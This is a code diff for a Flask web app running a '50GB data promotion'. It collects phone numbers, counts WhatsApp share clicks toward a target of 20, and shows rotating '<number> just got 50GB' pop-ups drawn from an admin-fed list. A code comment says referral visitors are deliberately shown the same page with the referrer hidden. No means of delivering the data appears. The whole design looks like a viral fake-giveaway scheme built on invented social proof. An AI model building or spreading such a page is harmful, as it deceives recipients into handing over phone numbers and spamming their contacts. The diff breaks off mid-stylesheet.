@@ -13,8 +13,10 @@ from flask import (
     session,
     render_template_string,
     send_from_directory,
-    flash
+    flash,
+    jsonify
 )
+
 from werkzeug.utils import secure_filename
 
 
@@ -26,7 +28,7 @@ app = Flask(__name__)
 
 app.secret_key = os.environ.get(
     "SECRET_KEY",
-    "2009/30"
+    "change-this-secret-key"
 )
 
 ADMIN_USERNAME = os.environ.get(
@@ -39,13 +41,16 @@ ADMIN_PASSWORD = os.environ.get(
     "JEPHTHAH"
 )
 
+SITE_URL = os.environ.get(
+    "SITE_URL",
+    "https://your-site.onrender.com"
+).rstrip("/")
+
 DATABASE = "promotion.db"
+
 UPLOAD_FOLDER = "uploads"
 
-os.makedirs(UPLOAD_FOLDER, exist_ok=True)
-
-app.config["UPLOAD_FOLDER"] = UPLOAD_FOLDER
-app.config["MAX_CONTENT_LENGTH"] = 8 * 1024 * 1024
+MAX_CONTENT_LENGTH = 8 * 1024 * 1024
 
 ALLOWED_EXTENSIONS = {
     "jpg",
@@ -53,6 +58,11 @@ ALLOWED_EXTENSIONS = {
     "png",
     "webp"
 }
+
+app.config["UPLOAD_FOLDER"] = UPLOAD_FOLDER
+app.config["MAX_CONTENT_LENGTH"] = MAX_CONTENT_LENGTH
+
+os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 
 
 # ============================================================
@@ -66,12 +76,11 @@ def get_db():
 
 
 def setup_database():
-
     conn = get_db()
 
     conn.execute("""
         CREATE TABLE IF NOT EXISTS campaign (
-            id INTEGER PRIMARY KEY,
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
             heading TEXT NOT NULL,
             message TEXT NOT NULL,
             referral_target INTEGER NOT NULL DEFAULT 20,
@@ -82,33 +91,41 @@ def setup_database():
     conn.execute("""
         CREATE TABLE IF NOT EXISTS participants (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
-            phone TEXT UNIQUE NOT NULL,
-            referral_code TEXT UNIQUE NOT NULL,
+            phone TEXT NOT NULL UNIQUE,
+            referral_code TEXT NOT NULL UNIQUE,
             referred_by TEXT,
             created_at TEXT NOT NULL
         )
     """)
 
-    campaign = conn.execute(
-        "SELECT id FROM campaign WHERE id = 1"
+    conn.execute("""
+        CREATE TABLE IF NOT EXISTS share_clicks (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            referral_code TEXT NOT NULL,
+            created_at TEXT NOT NULL
+        )
+    """)
+
+    conn.execute("""
+        CREATE TABLE IF NOT EXISTS credited_numbers (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            masked_phone TEXT NOT NULL,
+            created_at TEXT NOT NULL
+        )
+    """)
+
+    existing_campaign = conn.execute(
+        "SELECT id FROM campaign LIMIT 1"
     ).fetchone()
 
-    if not campaign:
-
+    if not existing_campaign:
         conn.execute("""
             INSERT INTO campaign
-            (
-                id,
-                heading,
-                message,
-                referral_target,
-                image
-            )
-            VALUES (?, ?, ?, ?, ?)
+            (heading, message, referral_target, image)
+            VALUES (?, ?, ?, ?)
         """, (
-            1,
-            "",
-            "",
+            "ELITE 50GB PROMOTION",
+            "🎁 Take part in our promotional offer and follow the steps below to claim your 50GB offer.",
             20,
             None
         ))
@@ -117,19 +134,15 @@ def setup_database():
     conn.close()
 
 
-setup_database()
-
-
 # ============================================================
-# HELPERS
+# CAMPAIGN
 # ============================================================
 
 def get_campaign():
-
     conn = get_db()
 
     campaign = conn.execute(
-        "SELECT * FROM campaign WHERE id = 1"
+        "SELECT * FROM campaign ORDER BY id ASC LIMIT 1"
     ).fetchone()
 
     conn.close()
@@ -137,39 +150,61 @@ def get_campaign():
     return campaign
 
 
-def allowed_file(filename):
+# ============================================================
+# HELPERS
+# ============================================================
 
+def allowed_file(filename):
     return (
         "." in filename
-        and filename.rsplit(
-            ".",
-            1
-        )[1].lower() in ALLOWED_EXTENSIONS
+        and filename.rsplit(".", 1)[1].lower()
+        in ALLOWED_EXTENSIONS
     )
 
 
-def admin_required(function):
+def mask_phone(phone):
+    """
+    Store/display only a masked version publicly.
 
-    @wraps(function)
-    def wrapper(*args, **kwargs):
+    Example:
+    08031234567 -> 0803****567
+    """
 
-        if not session.get("admin_logged_in"):
-            return redirect(
-                url_for("admin_login")
-            )
+    digits = "".join(
+        character
+        for character in phone
+        if character.isdigit()
+    )
 
-        return function(*args, **kwargs)
+    if len(digits) <= 7:
+        return "*" * len(digits)
 
-    return wrapper
+    return digits[:4] + "****" + digits[-3:]
 
 
 def get_referral_count(code):
-
     conn = get_db()
 
     result = conn.execute(
         """
-        SELECT COUNT(*)
+        SELECT COUNT(*) AS total
+        FROM share_clicks
+        WHERE referral_code = ?
+        """,
+        (code,)
+    ).fetchone()
+
+    conn.close()
+
+    return result["total"]
+
+
+def get_registration_count(code):
+    conn = get_db()
+
+    result = conn.execute(
+        """
+        SELECT COUNT(*) AS total
         FROM participants
         WHERE referred_by = ?
         """,
@@ -178,638 +213,23 @@ def get_referral_count(code):
 
     conn.close()
 
-    return result[0]
+    return result["total"]
+
+
+def admin_required(function):
+    @wraps(function)
+    def decorated_function(*args, **kwargs):
+
+        if not session.get("admin_logged_in"):
+            return redirect(url_for("admin_login"))
+
+        return function(*args, **kwargs)
+
+    return decorated_function
 
 
 # ============================================================
 # PUBLIC HOME PAGE
-# ============================================================
-
-HOME_PAGE = """
-<!DOCTYPE html>
-
-<html>
-
-<head>
-
-<meta name="viewport"
-      content="width=device-width, initial-scale=1">
-
-<title>{{ campaign['heading'] or 'Promotional Offer' }}</title>
-
-<style>
-
-* {
-    box-sizing: border-box;
-}
-
-body {
-
-    margin: 0;
-
-    padding: 0;
-
-    font-family: Arial, sans-serif;
-
-    color: #172033;
-
-    background:
-        linear-gradient(
-            135deg,
-            #dff7ff,
-            #f8fcff,
-            #fff8d6
-        );
-}
-
-
-/* =========================================
-   MAIN CONTAINER
-   ========================================= */
-
-.container {
-
-    width: 94%;
-
-    max-width: 600px;
-
-    margin: 20px auto 45px;
-
-}
-
-
-/* =========================================
-   ADMIN IMAGE + ADMIN TEXT
-   ========================================= */
-
-.hero {
-
-    background: white;
-
-    border-radius: 22px;
-
-    overflow: hidden;
-
-    margin-bottom: 20px;
-
-    box-shadow:
-        0 12px 35px
-        rgba(0, 150, 255, 0.18);
-
-    animation:
-        floating 4s ease-in-out infinite;
-
-}
-
-
-/* =========================================
-   IMAGE
-   ========================================= */
-
-.hero-image {
-
-    width: 100%;
-
-    display: block;
-
-    max-height: 430px;
-
-    object-fit: cover;
-
-}
-
-
-/* =========================================
-   ADMIN TEXT
-   ========================================= */
-
-.hero-content {
-
-    padding: 25px 22px 30px;
-
-    text-align: center;
-
-    background:
-        linear-gradient(
-            180deg,
-            #ffffff,
-            #effbff
-        );
-
-}
-
-
-.hero-content h1 {
-
-    margin: 0 0 14px;
-
-    font-size: 30px;
-
-    line-height: 1.2;
-
-    font-weight: 900;
-
-    color: #008bd2;
-
-    text-shadow:
-        0 3px 10px
-        rgba(0, 139, 210, 0.18);
-
-}
-
-
-.hero-content p {
-
-    margin: 0;
-
-    font-size: 18px;
-
-    line-height: 1.6;
-
-    font-weight: 700;
-
-    color: #172033;
-
-    white-space: pre-line;
-
-}
-
-
-/* =========================================
-   FLOATING ANIMATION
-   ========================================= */
-
-@keyframes floating {
-
-    0% {
-        transform: translateY(0);
-    }
-
-    50% {
-        transform: translateY(-7px);
-    }
-
-    100% {
-        transform: translateY(0);
-    }
-
-}
-
-
-/* =========================================
-   OFFER CARD
-   ========================================= */
-
-.offer {
-
-    position: relative;
-
-    overflow: hidden;
-
-    background: white;
-
-    border-radius: 22px;
-
-    padding: 28px 22px;
-
-    text-align: center;
-
-    box-shadow:
-        0 12px 35px
-        rgba(0, 150, 255, 0.16);
-
-    animation:
-        floating 4.5s ease-in-out infinite;
-
-}
-
-
-/* =========================================
-   DECORATIVE WATER EFFECT
-   ========================================= */
-
-.offer::before {
-
-    content: "";
-
-    position: absolute;
-
-    width: 190px;
-
-    height: 190px;
-
-    border-radius: 50%;
-
-    background:
-        rgba(0, 174, 255, 0.12);
-
-    top: -90px;
-
-    left: -70px;
-
-    animation:
-        waterMove 5s ease-in-out infinite;
-
-}
-
-
-.offer::after {
-
-    content: "";
-
-    position: absolute;
-
-    width: 170px;
-
-    height: 170px;
-
-    border-radius: 50%;
-
-    background:
-        rgba(255, 210, 0, 0.14);
-
-    right: -70px;
-
-    bottom: -90px;
-
-    animation:
-        waterMove 6s ease-in-out infinite reverse;
-
-}
-
-
-@keyframes waterMove {
-
-    0% {
-        transform: translate(0, 0);
-    }
-
-    50% {
-        transform: translate(20px, -12px);
-    }
-
-    100% {
-        transform: translate(0, 0);
-    }
-
-}
-
-
-.offer > * {
-
-    position: relative;
-
-    z-index: 2;
-
-}
-
-
-/* =========================================
-   OFFER HEADING
-   ========================================= */
-
-.offer h2 {
-
-    margin-top: 0;
-
-    color: #008bd2;
-
-    font-size: 22px;
-
-    font-weight: 900;
-
-}
-
-
-/* =========================================
-   50GB
-   ========================================= */
-
-.gb {
-
-    font-size: 58px;
-
-    font-weight: 900;
-
-    color: #f4b400;
-
-    margin: 8px 0;
-
-    text-shadow:
-        0 3px 10px
-        rgba(244, 180, 0, 0.25);
-
-    animation:
-        gbFloat 3s ease-in-out infinite;
-
-}
-
-
-@keyframes gbFloat {
-
-    0% {
-        transform: translateY(0);
-    }
-
-    50% {
-        transform: translateY(-6px);
-    }
-
-    100% {
-        transform: translateY(0);
-    }
-
-}
-
-
-.subtitle {
-
-    color: #596579;
-
-    margin-bottom: 24px;
-
-    font-weight: 600;
-
-}
-
-
-/* =========================================
-   PHONE INPUT
-   ========================================= */
-
-input {
-
-    width: 100%;
-
-    padding: 16px;
-
-    border:
-        2px solid #d7eefa;
-
-    border-radius: 13px;
-
-    font-size: 16px;
-
-    margin-bottom: 13px;
-
-    outline: none;
-
-}
-
-
-input:focus {
-
-    border-color: #00a8ff;
-
-    box-shadow:
-        0 0 0 4px
-        rgba(0, 168, 255, 0.12);
-
-}
-
-
-/* =========================================
-   CLAIM BUTTON
-   ========================================= */
-
-button {
-
-    width: 100%;
-
-    padding: 16px;
-
-    border: none;
-
-    border-radius: 13px;
-
-    font-size: 17px;
-
-    font-weight: 900;
-
-    cursor: pointer;
-
-}
-
-
-.claim {
-
-    color: white;
-
-    background:
-        linear-gradient(
-            135deg,
-            #009fe3,
-            #0077ff
-        );
-
-    box-shadow:
-        0 8px 20px
-        rgba(0, 126, 255, 0.25);
-
-    animation:
-        buttonFloat 3s ease-in-out infinite;
-
-}
-
-
-@keyframes buttonFloat {
-
-    0% {
-        transform: translateY(0);
-    }
-
-    50% {
-        transform: translateY(-4px);
-    }
-
-    100% {
-        transform: translateY(0);
-    }
-
-}
-
-
-.claim:active {
-
-    transform: scale(0.97);
-
-}
-
-
-/* =========================================
-   INFO
-   ========================================= */
-
-.info {
-
-    margin-top: 18px;
-
-    color: #687386;
-
-    font-size: 14px;
-
-    line-height: 1.5;
-
-}
-
-
-/* =========================================
-   MOBILE
-   ========================================= */
-
-@media (max-width: 480px) {
-
-    .container {
-        width: 94%;
-    }
-
-    .hero-content h1 {
-        font-size: 26px;
-    }
-
-    .hero-content p {
-        font-size: 16px;
-    }
-
-    .gb {
-        font-size: 50px;
-    }
-
-}
-
-</style>
-
-</head>
-
-
-<body>
-
-<div class="container">
-
-
-    <!-- ======================================
-         ADMIN IMAGE + HEADING + TEXT
-         ====================================== -->
-
-    {% if campaign['image']
-       or campaign['heading']
-       or campaign['message'] %}
-
-    <div class="hero">
-
-
-        {% if campaign['image'] %}
-
-        <img
-            class="hero-image"
-            src="{{ url_for(
-                'uploaded_file',
-                filename=campaign['image']
-            ) }}"
-            alt="Campaign image"
-        >
-
-        {% endif %}
-
-
-        {% if campaign['heading']
-           or campaign['message'] %}
-
-        <div class="hero-content">
-
-
-            {% if campaign['heading'] %}
-
-            <h1>
-                {{ campaign['heading'] }}
-            </h1>
-
-            {% endif %}
-
-
-            {% if campaign['message'] %}
-
-            <p>
-                {{ campaign['message'] }}
-            </p>
-
-            {% endif %}
-
-
-        </div>
-
-        {% endif %}
-
-
-    </div>
-
-    {% endif %}
-
-
-    <!-- ======================================
-         50GB SECTION
-         ====================================== -->
-
-    <div class="offer">
-
-        <h2>
-            Available Data Offer
-        </h2>
-
-
-        <div class="gb">
-            50GB
-        </div>
-
-
-        <div class="subtitle">
-            Enter your phone number to continue.
-        </div>
-
-
-        <form
-            action="{{ url_for('claim') }}"
-            method="POST"
-        >
-
-            <input
-                type="tel"
-                name="phone"
-                placeholder="Enter your phone number"
-                required
-            >
-
-
-            <button
-                class="claim"
-                type="submit"
-            >
-                CLAIM NOW
-            </button>
-
-        </form>
-
-
-        <div class="info">
-
-            After registering, you will receive
-            your personal referral link.
-
-        </div>
-
-    </div>
-
-
-</div>
-
-</body>
-
-</html>
-"""
-
-
-# ============================================================
-# HOME ROUTE
 # ============================================================
 
 @app.route("/")
@@ -817,14 +237,333 @@ def home():
 
     campaign = get_campaign()
 
-    return render_template_string(
-        HOME_PAGE,
-        campaign=campaign
-    )
+    return render_template_string("""
+<!DOCTYPE html>
+<html>
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0"
+    >
+
+    <title>{{ campaign['heading'] }}</title>
+
+    <style>
+
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background: #f0f4f8;
+            color: #222;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: auto;
+            min-height: 100vh;
+            background: white;
+        }
+
+        .banner {
+            width: 100%;
+            background: #111;
+        }
+
+        .banner img {
+            width: 100%;
+            display: block;
+            max-height: 430px;
+            object-fit: cover;
+        }
+
+        .content {
+            padding: 24px 18px;
+        }
+
+        h1 {
+            text-align: center;
+            margin-top: 0;
+        }
+
+        .message {
+            text-align: center;
+            line-height: 1.6;
+        }
+
+        .offer {
+            margin-top: 20px;
+            padding: 20px;
+            border-radius: 14px;
+            background: #e8f7ff;
+            text-align: center;
+        }
+
+        .offer h2 {
+            margin-top: 0;
+        }
+
+        input {
+            width: 100%;
+            padding: 15px;
+            margin-top: 15px;
+            border: 1px solid #ccc;
+            border-radius: 10px;
+            font-size: 16px;
+        }
+
+        button {
+            width: 100%;
+            padding: 15px;
+            margin-top: 12px;
+            border: none;
+            border-radius: 10px;
+            background: #0077b6;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .small {
+            text-align: center;
+            color: #777;
+            font-size: 13px;
+            margin-top: 15px;
+        }
+
+        .credit-notification {
+            position: fixed;
+            left: 50%;
+            bottom: 20px;
+            transform: translateX(-50%);
+            width: calc(100% - 30px);
+            max-width: 520px;
+            background: #111;
+            color: white;
+            padding: 14px 45px 14px 16px;
+            border-radius: 12px;
+            box-shadow: 0 5px 25px rgba(0,0,0,.25);
+            display: none;
+            z-index: 9999;
+            font-size: 14px;
+        }
+
+        .credit-notification button {
+            position: absolute;
+            right: 8px;
+            top: 4px;
+            width: auto;
+            margin: 0;
+            padding: 5px 9px;
+            background: transparent;
+            color: white;
+            font-size: 18px;
+        }
+
+        footer {
+            text-align: center;
+            padding: 25px 10px;
+            font-size: 13px;
+            color: #777;
+        }
+
+        footer a {
+            color: #0077b6;
+            text-decoration: none;
+            margin: 0 7px;
+        }
+
+    </style>
+
+</head>
+
+<body>
+
+<div class="container">
+
+    {% if campaign['image'] %}
+
+    <div class="banner">
+        <img
+            src="{{ url_for(
+                'uploaded_file',
+                filename=campaign['image']
+            ) }}"
+            alt="Promotion"
+        >
+    </div>
+
+    {% endif %}
+
+    <div class="content">
+
+        <h1>{{ campaign['heading'] }}</h1>
+
+        <div class="message">
+            {{ campaign['message'] }}
+        </div>
+
+        <div class="offer">
+
+            <h2>🎁 Claim Your 50GB</h2>
+
+            <p>
+                Enter your phone number below to continue.
+            </p>
+
+        </div>
+
+        <form method="POST" action="{{ url_for('claim') }}">
+
+            <input
+                type="text"
+                name="phone"
+                placeholder="Enter your phone number"
+                required
+            >
+
+            <button type="submit">
+                CONTINUE
+            </button>
+
+        </form>
+
+        <div class="small">
+            Follow the steps to continue with the promotion.
+        </div>
+
+    </div>
+
+    <footer>
+
+        <a href="{{ url_for('privacy') }}">
+            Privacy Policy
+        </a>
+
+        |
+
+        <a href="{{ url_for('terms') }}">
+            Terms
+        </a>
+
+    </footer>
+
+</div>
+
+
+<div
+    id="creditNotification"
+    class="credit-notification"
+>
+
+    <span id="creditText"></span>
+
+    <button
+        type="button"
+        onclick="closeCreditNotification()"
+    >
+        ×
+    </button>
+
+</div>
+
+
+<script>
+
+let creditedNumbers = [];
+let currentCreditIndex = 0;
+let creditTimer = null;
+
+
+async function loadCreditedNumbers() {
+
+    try {
+
+        const response = await fetch(
+            "{{ url_for('api_credited_numbers') }}"
+        );
+
+        const data = await response.json();
+
+        creditedNumbers = data.numbers || [];
+
+        if (creditedNumbers.length > 0) {
+
+            showNextCredit();
+
+            if (!creditTimer) {
+
+                creditTimer = setInterval(
+                    showNextCredit,
+                    4000
+                );
+
+            }
+
+        }
+
+    } catch (error) {
+
+        console.log("Notification loading error");
+
+    }
+
+}
+
+
+function showNextCredit() {
+
+    if (creditedNumbers.length === 0) {
+        return;
+    }
+
+    const number =
+        creditedNumbers[
+            currentCreditIndex %
+            creditedNumbers.length
+        ];
+
+    document.getElementById(
+        "creditText"
+    ).textContent =
+        number + " just got 50GB 🎉";
+
+    document.getElementById(
+        "creditNotification"
+    ).style.display = "block";
+
+    currentCreditIndex++;
+
+}
+
+
+function closeCreditNotification() {
+
+    document.getElementById(
+        "creditNotification"
+    ).style.display = "none";
+
+}
+
+
+loadCreditedNumbers();
+
+</script>
+
+</body>
+</html>
+""", campaign=campaign)
 
 
 # ============================================================
-# CLAIM
+# CLAIM / NORMAL REGISTRATION
 # ============================================================
 
 @app.route("/claim", methods=["POST"])
@@ -836,72 +575,52 @@ def claim():
     ).strip()
 
     if not phone:
-        return redirect(
-            url_for("home")
-        )
+        return redirect(url_for("home"))
 
     conn = get_db()
 
     existing = conn.execute(
         """
-        SELECT *
+        SELECT referral_code
         FROM participants
         WHERE phone = ?
         """,
         (phone,)
     ).fetchone()
 
+    conn.close()
+
     if existing:
-
-        referral_code = existing["referral_code"]
-
-        conn.close()
 
         return redirect(
             url_for(
                 "invite",
-                code=referral_code
+                code=existing["referral_code"]
             )
         )
-
 
     referral_code = secrets.token_urlsafe(8)
 
+    conn = get_db()
 
-    try:
-
-        conn.execute(
-            """
-            INSERT INTO participants
-            (
-                phone,
-                referral_code,
-                referred_by,
-                created_at
-            )
-            VALUES (?, ?, ?, ?)
-            """,
-            (
-                phone,
-                referral_code,
-                None,
-                datetime.utcnow().isoformat()
-            )
+    conn.execute("""
+        INSERT INTO participants
+        (
+            phone,
+            referral_code,
+            referred_by,
+            created_at
         )
+        VALUES (?, ?, ?, ?)
+    """, (
+        phone,
+        referral_code,
+        None,
+        datetime.utcnow().isoformat()
+    ))
 
-        conn.commit()
-
-    except sqlite3.IntegrityError:
-
-        conn.close()
-
-        return redirect(
-            url_for("home")
-        )
-
-
+    conn.commit()
     conn.close()
-
 
     return redirect(
         url_for(
@@ -912,378 +631,227 @@ def claim():
 
 
 # ============================================================
-# REFERRAL PAGE
-# ============================================================
-
-@app.route("/invite/<code>")
-def invite(code):
-
-    campaign = get_campaign()
-
-    count = get_referral_count(code)
-
-    target = campaign["referral_target"]
-
-
-    share_link = (
-        request.host_url.rstrip("/")
-        + url_for(
-            "join_referral",
-            referrer=code
-        )
-    )
-
-
-    whatsapp_message = (
-        "🎁 Check out this 50GB data promotion.\n\n"
-    "You can check your eligibility here:\n"
-        + share_link
-    )
-
-
-    whatsapp_url = (
-        "https://wa.me/?text="
-        + quote(whatsapp_message)
-    )
-
-
-    page = """
-
-<!DOCTYPE html>
-
-<html>
-
-<head>
-
-<meta name="viewport"
-      content="width=device-width, initial-scale=1">
-
-<title>Referral</title>
-
-<style>
-
-body {
-
-    margin: 0;
-
-    padding: 25px;
-
-    font-family: Arial;
-
-    background:
-        linear-gradient(
-            135deg,
-            #e0f7ff,
-            #fff8d6
-        );
-
-}
-
-.box {
-
-    max-width: 500px;
-
-    margin: 30px auto;
-
-    background: white;
-
-    padding: 28px;
-
-    border-radius: 22px;
-
-    text-align: center;
-
-    box-shadow:
-        0 12px 35px
-        rgba(0, 150, 255, 0.18);
-
-}
-
-.count {
-
-    font-size: 48px;
-
-    font-weight: 900;
-
-    color: #008bd2;
-
-    margin: 20px;
-
-}
-
-a {
-
-    display: block;
-
-    text-decoration: none;
-
-    padding: 16px;
-
-    margin-top: 15px;
-
-    border-radius: 12px;
-
-    font-weight: 900;
-
-}
-
-.share {
-
-    background: #25D366;
-
-    color: white;
-
-}
-
-.home {
-
-    background: #008bd2;
-
-    color: white;
-
-}
-
-</style>
-
-</head>
-
-
-<body>
-
-<div class="box">
-
-<h2>
-    Invite People
-</h2>
-
-<p>
-    Your referral progress
-</p>
-
-<div class="count">
-
-    {{ count }} / {{ target }}
-
-</div>
-
-
-{% if count >= target %}
-
-<h3>
-    Referral target reached!
-</h3>
-
-{% else %}
-
-<p>
-    Invite {{ target - count }}
-    more people.
-</p>
-
-{% endif %}
-
-
-<a
-    class="share"
-    href="{{ whatsapp_url }}"
-    target="_blank"
->
-    SHARE ON WHATSAPP
-</a>
-
-
-<a
-    class="home"
-    href="{{ url_for('home') }}"
->
-    BACK TO OFFER
-</a>
-
-
-</div>
-
-</body>
-
-</html>
-
-"""
-
-
-    return render_template_string(
-        page,
-        count=count,
-        target=target,
-        whatsapp_url=whatsapp_url
-    )
-
-
-# ============================================================
-# JOIN THROUGH REFERRAL
+# REFERRAL LANDING PAGE
 # ============================================================
 
 @app.route("/join/<referrer>")
 def join_referral(referrer):
 
-    page = """
+    conn = get_db()
 
+    referrer_user = conn.execute(
+        """
+        SELECT id
+        FROM participants
+        WHERE referral_code = ?
+        """,
+        (referrer,)
+    ).fetchone()
+
+    conn.close()
+
+    if not referrer_user:
+        return redirect(url_for("home"))
+
+    campaign = get_campaign()
+
+    # IMPORTANT:
+    # This page deliberately uses the same visual promotion
+    # as the normal home page.
+    #
+    # The visitor does NOT see a special referral page.
+    #
+    # The referrer code is simply kept hidden in the form.
+
+    return render_template_string("""
 <!DOCTYPE html>
-
 <html>
-
 <head>
 
-<meta name="viewport"
-      content="width=device-width, initial-scale=1">
+    <meta charset="UTF-8">
 
-<title>Join Promotion</title>
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0"
+    >
 
-<style>
+    <title>{{ campaign['heading'] }}</title>
 
-body {
+    <style>
 
-    font-family: Arial;
+        * {
+            box-sizing: border-box;
+        }
 
-    background:
-        linear-gradient(
-            135deg,
-            #e0f7ff,
-            #fff8d6
-        );
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background: #f0f4f8;
+            color: #222;
+        }
 
-    padding: 25px;
+        .container {
+            max-width: 600px;
+            margin: auto;
+            min-height: 100vh;
+            background: white;
+        }
 
-}
+        .banner {
+            width: 100%;
+            background: #111;
+        }
 
-.box {
+        .banner img {
+            width: 100%;
+            display: block;
+            max-height: 430px;
+            object-fit: cover;
+        }
 
-    max-width: 500px;
+        .content {
+            padding: 24px 18px;
+        }
 
-    margin: 40px auto;
+        h1 {
+            text-align: center;
+            margin-top: 0;
+        }
 
-    background: white;
+        .message {
+            text-align: center;
+            line-height: 1.6;
+        }
 
-    padding: 28px;
+        .offer {
+            margin-top: 20px;
+            padding: 20px;
+            border-radius: 14px;
+            background: #e8f7ff;
+            text-align: center;
+        }
 
-    border-radius: 22px;
+        .offer h2 {
+            margin-top: 0;
+        }
 
-    text-align: center;
+        input {
+            width: 100%;
+            padding: 15px;
+            margin-top: 15px;
+            border: 1px solid #ccc;
+            border-radius: 10px;
+            font-size: 16px;
+        }
 
-    box-shadow:
-        0 12px 35px
-        rgba(0, 150, 255, 0.18);
+        button {
+            width: 100%;
+            padding: 15px;
+            margin-top: 12px;
+            border: none;
+            border-radius: 10px;
+            background: #0077b6;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
 
-}
+        .small {
+            text-align: center;
+            color: #777;
+            font-size: 13px;
+            margin-top: 15px;
+        }
 
-input {
-
-    width: 100%;
-
-    box-sizing: border-box;
-
-    padding: 16px;
-
-    margin: 15px 0;
-
-    border-radius: 12px;
-
-    border:
-        2px solid #d7eefa;
-
-    font-size: 16px;
-
-}
-
-button {
-
-    width: 100%;
-
-    padding: 16px;
-
-    border: 0;
-
-    border-radius: 12px;
-
-    background:
-        linear-gradient(
-            135deg,
-            #009fe3,
-            #0077ff
-        );
-
-    color: white;
-
-    font-size: 16px;
-
-    font-weight: 900;
-
-}
-
-</style>
+    </style>
 
 </head>
 
-
 <body>
 
-<div class="box">
+<div class="container">
 
-<h2>
-    Join the Promotion
-</h2>
+    {% if campaign['image'] %}
 
-<p>
-    Enter your phone number to continue.
-</p>
+    <div class="banner">
 
+        <img
+            src="{{ url_for(
+                'uploaded_file',
+                filename=campaign['image']
+            ) }}"
+            alt="Promotion"
+        >
 
-<form
-    action="{{ url_for('register_referral') }}"
-    method="POST"
->
+    </div>
 
-<input
-    type="tel"
-    name="phone"
-    placeholder="Phone number"
-    required
->
+    {% endif %}
 
+    <div class="content">
 
-<input
-    type="hidden"
-    name="referrer"
-    value="{{ referrer }}"
->
+        <h1>{{ campaign['heading'] }}</h1>
 
+        <div class="message">
+            {{ campaign['message'] }}
+        </div>
 
-<button type="submit">
-    CONTINUE
-</button>
+        <div class="offer">
 
-</form>
+            <h2>🎁 Claim Your 50GB</h2>
+
+            <p>
+                Enter your phone number below to continue.
+            </p>
+
+        </div>
+
+        <form
+            method="POST"
+            action="{{ url_for('register_referral') }}"
+        >
+
+            <input
+                type="text"
+                name="phone"
+                placeholder="Enter your phone number"
+                required
+            >
+
+            <!-- Referral code is hidden -->
+            <input
+                type="hidden"
+                name="referrer"
+                value="{{ referrer }}"
+            >
+
+            <button type="submit">
+                CONTINUE
+            </button>
+
+        </form>
+
+        <div class="small">
+            Follow the steps to continue with the promotion.
+        </div>
+
+    </div>
 
 </div>
 
 </body>
-
 </html>
-
-"""
-
-    return render_template_string(
-        page,
-        referrer=referrer
-    )
-
-
-# ============================================================
-# REGISTER REFERRAL
-# ============================================================
-
-@app.route(
-    "/register-referral",
-    methods=["POST"]
+""",
+    campaign=campaign,
+    referrer=referrer
 )
+
+
+# ============================================================
+# REGISTER A REFERRED PERSON
+# ============================================================
+
+@app.route("/register-referral", methods=["POST"])
 def register_referral():
 
     phone = request.form.get(
@@ -1296,42 +864,37 @@ def register_referral():
         ""
     ).strip()
 
-
-    if not phone or not referrer:
-
-        return redirect(
-            url_for("home")
-        )
-
+    if not phone:
+        return redirect(url_for("home"))
 
     conn = get_db()
 
+    # If this phone already exists, send the person
+    # to their existing personal page.
 
     existing = conn.execute(
         """
-        SELECT *
+        SELECT referral_code
         FROM participants
         WHERE phone = ?
         """,
         (phone,)
     ).fetchone()
 
-
     if existing:
-
-        referral_code = existing["referral_code"]
 
         conn.close()
 
         return redirect(
             url_for(
                 "invite",
-                code=referral_code
+                code=existing["referral_code"]
             )
         )
 
+    # Verify the referral code.
 
-    owner = conn.execute(
+    referrer_user = conn.execute(
         """
         SELECT id
         FROM participants
@@ -1340,8 +903,7 @@ def register_referral():
         (referrer,)
     ).fetchone()
 
-
-    if not owner:
+    if not referrer_user:
 
         conn.close()
 
@@ -1349,12 +911,9 @@ def register_referral():
             url_for("home")
         )
 
+    new_referral_code = secrets.token_urlsafe(8)
 
-    referral_code = secrets.token_urlsafe(8)
-
-
-    conn.execute(
-        """
+    conn.execute("""
         INSERT INTO participants
         (
             phone,
@@ -1363,31 +922,457 @@ def register_referral():
             created_at
         )
         VALUES (?, ?, ?, ?)
-        """,
-        (
-            phone,
-            referral_code,
-            referrer,
-            datetime.utcnow().isoformat()
-        )
-    )
-
+    """, (
+        phone,
+        new_referral_code,
+        referrer,
+        datetime.utcnow().isoformat()
+    ))
 
     conn.commit()
-
     conn.close()
-
 
     return redirect(
         url_for(
             "invite",
-            code=referral_code
+            code=new_referral_code
         )
     )
 
 
 # ============================================================
-# SERVE UPLOADED IMAGE
+# PERSONAL REFERRAL / SHARE PAGE
+# ============================================================
+
+@app.route("/invite/<code>")
+def invite(code):
+
+    conn = get_db()
+
+    participant = conn.execute(
+        """
+        SELECT *
+        FROM participants
+        WHERE referral_code = ?
+        """,
+        (code,)
+    ).fetchone()
+
+    conn.close()
+
+    if not participant:
+        return redirect(url_for("home"))
+
+    campaign = get_campaign()
+
+    count = get_referral_count(code)
+
+    target = int(
+        campaign["referral_target"] or 20
+    )
+
+    if count > target:
+        count = target
+
+    reached = count >= target
+
+    share_link = (
+        SITE_URL
+        + url_for(
+            "join_referral",
+            referrer=code
+        )
+    )
+
+    whatsapp_message = (
+        "🎁 Claim your 50GB!\n\n"
+        "Share this offer with your friends:\n"
+        + share_link
+    )
+
+    whatsapp_url = (
+        "https://wa.me/?text="
+        + quote(whatsapp_message)
+    )
+
+    return render_template_string("""
+<!DOCTYPE html>
+<html>
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0"
+    >
+
+    <title>Claim Your 50GB</title>
+
+    <style>
+
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background: #f0f4f8;
+            color: #222;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: auto;
+            min-height: 100vh;
+            background: white;
+            padding: 25px 18px;
+        }
+
+        .card {
+            background: white;
+            border-radius: 16px;
